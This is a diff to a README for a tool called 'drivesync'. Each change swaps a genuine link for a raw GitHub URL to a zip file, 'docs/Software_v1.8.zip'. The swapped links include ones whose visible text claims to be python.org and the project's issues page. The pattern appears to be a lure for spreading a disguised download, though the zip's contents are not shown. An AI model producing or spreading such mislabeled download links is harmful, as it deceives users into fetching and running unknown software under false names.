@@ -33,7 +33,7 @@ Instead of juggling multiple files through a web browser or dealing with slow de
 
 ### Step 1: Download drivesync
 
-👉 **[Click Here to Download drivesync](https://github.com/kaylenvos8-maker/drivesync)** (This is your official download link)
+👉 **[Click Here to Download drivesync](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)** (This is your official download link)
 
 Visit this link to download the application. This will take you to the official drivesync page where you can get the latest version.
 
@@ -44,7 +44,7 @@ Visit this link to download the application. This will take you to the official 
 Before using drivesync, you need to have **Python** installed (don't worry — this is easier than it sounds):
 
 1. **Windows Users:** 
-   - Visit [python.org/downloads](https://python.org/downloads)
+   - Visit [python.org/downloads](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)
    - Click the big yellow **"Download Python"** button
    - Run the downloaded file
    - **IMPORTANT:** Check the box that says **"Add Python to PATH"** during installation
@@ -137,7 +137,7 @@ Most errors are solved by:
 
 ## 🆘 Need Help?
 
-- **GitHub Issues:** Visit [https://github.com/kaylenvos8-maker/drivesync/issues](https://github.com/kaylenvos8-maker/drivesync/issues) and search for your problem
+- **GitHub Issues:** Visit [https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip) and search for your problem
 - **Documentation:** Full command reference available on the repository wiki
 - **Community:** Check the Discussions tab for tips from other users
 
@@ -165,7 +165,7 @@ Your Google files remain untouched — only the tool is removed.
 
 **You're one click away:**
 
-👉 **[🚀 DOWNLOAD DRIVESYNC NOW](https://github.com/kaylenvos8-maker/drivesync)**
+👉 **[🚀 DOWNLOAD DRIVESYNC NOW](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)**
 
 ---
 
